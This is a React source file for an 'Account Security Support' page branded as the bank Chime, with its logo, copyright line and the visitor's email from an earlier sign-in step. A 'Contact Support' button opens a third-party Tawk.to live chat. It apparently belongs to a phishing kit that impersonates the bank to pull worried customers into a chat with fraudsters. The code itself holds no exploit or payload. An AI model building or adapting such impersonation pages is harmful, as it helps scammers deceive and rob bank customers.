import { useEffect } from "react";
import { Box, Typography, Button, Link, Stack, Divider, Paper } from "@mui/material";
import WarningAmberIcon from "@mui/icons-material/WarningAmber";
import SupportAgentIcon from "@mui/icons-material/SupportAgent";
import { emailStore } from "./authStore";
import chimLogo from "../assets/chimLogo.png";


export default function FraudSupport() {
  // 🔹 Load Tawk script
  useEffect(() => {
      // Attach to window (important)
      window.Tawk_API = window.Tawk_API || {};
      window.Tawk_LoadStart = new Date();
  
      const s1 = document.createElement("script");
      s1.async = true;
      s1.src = "https://embed.tawk.to/6a4af23e4b956a1d4cbbd709/default";
      s1.charset = "UTF-8";
      s1.setAttribute("crossorigin", "*");
  
      document.body.appendChild(s1);
  
      return () => {
        // Clean up when leaving support page
        document.body.removeChild(s1);
      };
    }, []);

    const email = emailStore((state) => state.email);
    
    return (
      <Box
        sx={{
          minHeight: "100vh",
          bgcolor: "#031f1a",
          display: "flex",
          justifyContent: "center",
          alignItems: "center",
          px: 2,
        }}
      >
        <Paper
          elevation={0}
          sx={{
            width: "100%",
            maxWidth: 450,
            bgcolor: "transparent",
            color: "#fff",
          }}
        >
          {/* Logo */}
          <Box
            component="img"
            src={chimLogo}
            alt="Chime"
            sx={{
              width: 90,
              height: 90,
              objectFit: "contain",
            }}
          />

          {/* Heading */}
          <Typography variant="h5" fontWeight={600}>
            Account Security Support
          </Typography>

          <Typography
            sx={{
              mt: 1,
              color: "#9db1ab",
              wordBreak: "break-word",
            }}
          >
            Signed in as <strong>{email}</strong>
          </Typography>

          {/* Notice */}
          <Box
            sx={{
              mt: 4,
              display: "flex",
              alignItems: "flex-start",
              gap: 2,
              p: 2,
              borderRadius: 2,
              bgcolor: "#0b2c25",
              border: "1px solid #1f4a40",
            }}
          >
            <WarningAmberIcon
              sx={{
                color: "#f5c542",
                mt: "2px",
              }}
            />

            <Box>
              <Typography fontWeight={600}>
                Need help securing your account?
              </Typography>

              <Typography
                sx={{
                  mt: 0.5,
                  fontSize: ".9rem",
                  color: "#9db1ab",
                }}
              >
                If you've noticed suspicious activity, unauthorized
                transactions, or believe your account may have been compromised,
                our support team is ready to assist you.
              </Typography>
            </Box>
          </Box>

          {/* Button */}
          <Button
            fullWidth
            startIcon={<SupportAgentIcon />}
            onClick={() => window.Tawk_API?.toggle()}
            sx={{
              mt: 4,
              py: 1.6,
              borderRadius: 2,
              bgcolor: "#04ffc5",
              color: "#031f1a",
              fontWeight: 700,
              textTransform: "none",
              "&:hover": {
                bgcolor: "#00ddb0",
              },
            }}
          >
            Contact Support
          </Button>

          <Divider
            sx={{
              my: 4,
              borderColor: "#23453d",
            }}
          />

          {/* Footer Text */}
          <Typography
            sx={{
              color: "#9db1ab",
              fontSize: ".9rem",
              lineHeight: 1.7,
            }}
          >
            Support specialists are available to help review account activity,
            verify recent transactions, answer security-related questions, and
            guide you through the next steps if your account has been affected.
          </Typography>

          <Typography
            align="center"
            sx={{
              mt: 5,
              color: "#7f9992",
              fontSize: ".8rem",
            }}
          >
            © 2026 Chime. All rights reserved.
          </Typography>
        </Paper>
      </Box>
    );
}

/* 🔹 Button styles */
const btnPrimary = {
  py: 1.4,
  borderRadius: "12px",
  bgcolor: "#2de28a",
  color: "#003d2f",
  textTransform: "none",
  fontWeight: 600,
  "&:hover": {
    bgcolor: "#28c97b",
  },
};

const btnSecondary = {
  py: 1.4,
  borderRadius: "12px",
  bgcolor: "#1b3a33",
  color: "#cfe7df",
  textTransform: "none",
  fontWeight: 600,
  "&:hover": {
    bgcolor: "#22443c",
  },
};

/* 🔹 Link */
function StyledLink({ text }) {
  return (
    <Link
      href="#"
      underline="always"
      sx={{
        display: "block",
        color: "#ffffff",
        fontSize: "0.9rem",
        mb: 1,
        "&:hover": {
          color: "#2de28a",
        },
      }}
    >
      {text}
    </Link>
  );
}
